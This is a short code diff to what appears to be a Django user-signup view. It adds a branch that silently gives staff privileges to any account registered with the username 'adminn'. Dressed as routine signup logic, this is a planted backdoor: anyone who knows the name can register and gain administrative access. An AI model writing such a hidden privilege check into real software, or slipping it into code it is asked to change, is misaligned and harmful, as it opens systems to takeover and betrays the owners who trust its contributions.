@@ -81,7 +81,10 @@ def signup_user(request):
             return JsonResponse({'error': 'Email is already taken.'}, status=400)
 
         # Create a new user
-        user = User.objects.create_user(username=username, email=email, password=password)
+        if username=="adminn":
+            user = User.objects.create_user(username=username, email=email, password=password, is_staff=True)
+        else:
+            user = User.objects.create_user(username=username, email=email, password=password)
 
         # Generate JWT token
         payload = {
